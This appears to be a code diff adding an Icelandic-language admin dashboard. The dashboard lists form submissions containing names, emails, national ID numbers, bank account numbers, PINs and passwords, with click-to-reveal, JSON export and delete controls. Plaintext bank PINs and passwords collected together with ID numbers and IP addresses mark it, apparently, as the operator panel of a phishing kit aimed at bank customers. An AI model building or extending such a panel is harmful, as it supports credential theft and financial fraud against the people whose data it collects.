@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="is">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin – Skráningar</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f4f5f9;
+      color: #1a1a2e;
+      padding: 24px;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    h1 { margin: 0; font-size: 22px; }
+    .count {
+      background: #667eea;
+      color: #fff;
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .toolbar {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 14px;
+    }
+    button {
+      padding: 8px 14px;
+      border: 1px solid #d0d0d8;
+      border-radius: 6px;
+      background: #fff;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    button:hover { background: #f0f0f5; }
+    .danger { color: #d33; border-color: #f0c0c0; }
+    .danger:hover { background: #fdecec; }
+    .table-wrap {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      overflow: auto;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+      min-width: 1000px;
+    }
+    th, td {
+      padding: 10px 12px;
+      text-align: left;
+      border-bottom: 1px solid #eee;
+      white-space: nowrap;
+    }
+    th {
+      background: #fafafd;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+      color: #555;
+      position: sticky;
+      top: 0;
+    }
+    tr:hover td { background: #fafbff; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .empty {
+      padding: 40px;
+      text-align: center;
+      color: #888;
+    }
+    .pw {
+      cursor: pointer;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Skráningar</h1>
+    <span class="count" id="count">0</span>
+  </header>
+
+  <div class="toolbar">
+    <button id="refresh">Endurnýja</button>
+    <button id="export">Sækja JSON</button>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Tími</th>
+          <th>Nafn</th>
+          <th>Netfang</th>
+          <th>Kennitala</th>
+          <th>Reikningsnúmer</th>
+          <th>PIN</th>
+          <th>Lykilorð</th>
+          <th>IP</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <div class="empty" id="empty" style="display:none">Engar skráningar enn.</div>
+  </div>
+
+  <script>
+    const rows = document.getElementById("rows");
+    const empty = document.getElementById("empty");
+    const count = document.getElementById("count");
+
+    const fmt = (iso) => new Date(iso).toLocaleString("is-IS");
+    const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({
+      "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+    }[c]));
+    const mask = (s) => "•".repeat(s.length);
+
+    async function load() {
+      const res = await fetch("/api/submissions");
+      if (!res.ok) { alert("Aðgangur neitaður"); return; }
+      const list = await res.json();
+      list.sort((a, b) => b.createdAt.localeCompare(a.createdAt));
+      count.textContent = list.length;
+      rows.innerHTML = "";
+      empty.style.display = list.length ? "none" : "block";
+      for (const e of list) {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${esc(fmt(e.createdAt))}</td>
+          <td>${esc(e.nafn)}</td>
+          <td>${esc(e.netfang)}</td>
+          <td class="mono">${esc(e.kennitala)}</td>
+          <td class="mono">${esc(e.reikningur)}</td>
+          <td class="mono pw" data-real="${esc(e.pin)}">${mask(e.pin)}</td>
+          <td class="mono pw" data-real="${esc(e.password)}">${mask(e.password)}</td>
+          <td class="mono">${esc(e.ip || "")}</td>
+          <td><button class="danger" data-id="${e.id}">Eyða</button></td>
+        `;
+        rows.appendChild(tr);
+      }
+    }
+
+    rows.addEventListener("click", async (e) => {
+      const pw = e.target.closest(".pw");
+      if (pw) {
+        const real = pw.dataset.real;
+        pw.textContent = pw.textContent === real ? mask(real) : real;
+        return;
+      }
+      const del = e.target.closest("button.danger");
+      if (del && confirm("Eyða þessari skráningu?")) {
+        await fetch("/api/submissions/" + del.dataset.id, { method: "DELETE" });
+        load();
+      }
+    });
+
+    document.getElementById("refresh").addEventListener("click", load);
+    document.getElementById("export").addEventListener("click", () => {
+      window.open("/api/submissions", "_blank");
+    });
+
+    load();
+  </script>
+</body>
+</html>
